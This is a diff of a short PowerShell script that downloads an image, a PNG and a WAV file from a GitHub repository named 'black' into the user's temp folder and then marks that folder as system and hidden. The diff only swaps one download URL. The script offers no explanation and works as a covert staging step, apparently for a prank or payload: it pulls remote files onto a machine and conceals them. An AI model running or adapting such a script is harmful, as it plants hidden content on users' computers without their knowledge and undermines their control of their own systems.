@@ -1,4 +1,4 @@
-iwr "https://raw.githubusercontent.com/Noshbit/black/main/w.jpg" -outfile "$env:USERPROFILE\temp\w.jpg"
+iwr "https://raw.githubusercontent.com/Noshbit/black/main/w2.jpg" -outfile "$env:USERPROFILE\temp\w.jpg"
 iwr "https://raw.githubusercontent.com/Noshbit/black/main/f.png" -outfile "$env:USERPROFILE\temp\f.png"
 iwr "https://raw.githubusercontent.com/Noshbit/black/main/s.wav" -outfile "$env:USERPROFILE\temp\s.wav"
 attrib +s +h "$env:USERPROFILE\temp";
